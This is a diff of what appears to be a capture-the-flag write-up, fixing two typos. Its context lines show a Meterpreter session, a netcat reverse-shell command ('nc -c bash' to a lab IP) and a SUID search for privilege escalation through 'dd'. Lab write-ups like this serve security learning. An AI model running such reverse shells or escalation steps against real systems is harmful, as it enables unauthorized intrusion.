@@ -81,7 +81,7 @@ After setting all the details, a meterpreter session is opened:
 
 ![](/assets/img/Pasted-image-20250123224824.png)
 
-Note.- It is possibl to start a normal shell with command `shell` in meterpreter and using `nc`
+Note.- It is possible to start a normal shell with command `shell` in meterpreter and using `nc`
 
 ```bash
 meterpreter > shell
@@ -93,7 +93,7 @@ nc -c bash 10.10.5.122 2345
 
 ### Privilege Escalation
 
-By running looking for SUID binaries we identify that there is a SUID binary `dd` that has special privilege flag:
+By looking for SUID binaries we identify that there is a SUID binary `dd` that has special privilege flag:
 ```bash
 www-data@destroyercms:/tmp$ find / -perm -4000 2>/dev/null
 /usr/lib/openssh/ssh-keysign
